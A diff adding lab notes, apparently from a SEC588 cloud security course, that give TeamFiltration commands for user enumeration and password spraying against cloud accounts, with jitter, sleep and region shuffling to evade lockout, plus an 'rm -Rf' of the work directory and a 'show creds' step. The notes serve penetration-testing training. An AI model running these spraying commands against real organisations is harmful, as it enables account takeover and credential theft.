@@ -63,3 +63,46 @@ cat /opt/Wordlister/pw4.txt | wc -l
 ```
 cat /opt/Wordlister/pw4.txt | grep '^BirdPerson2021'
 ```
+
+### 9. Use the Teamfiltration tool for password spraying
+```
+/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 3 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/users.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions
+```
+
+This tool sometimes will crash unexpectedly where you will see errors like:
+
+    Cannot resolve the Amazon API Gateway that was just created
+    Too many Gateway request for delete at one time
+    False negatives where this may occur in the middle of a scan
+
+It is important to note that while this may seem like a problem, in many cases deleting the database can help you recover. Here is a simple way to do so:
+```
+rm -Rf /home/sec588/Coursefiles/workdir/teamfiltration
+```
+```
+/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/users.txt
+```
+
+### 10. View the results
+```
+/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database
+```
+
+> 
+    --usernames: A file containing the usernames
+    --outpath: This is the location where the teamfiltration database will live
+    --config: This is the configuration file to use
+    --validate-login: Use the more "noisy" flag in this way it will have 1 bad password attempt per email address
+    --spray: This is to perform a password spraying attack
+    --sleep-min: This will set the minimal sleep interval (1 minutes)
+    --sleep-max: This will set the maximum internal to wait (3 minutes)
+    --jitter: This is the amount to jitter between maximum and minimum time intervals
+    --usernames: This is the file containing usernames
+    --passwords: This is the file containing passwords
+    --shuffle-users: This command is to shuffle the usernames to test so that they are tested in different orders
+    --shuffle-region: This command is to shuffle between regions
+
+
+```
+show creds
+```
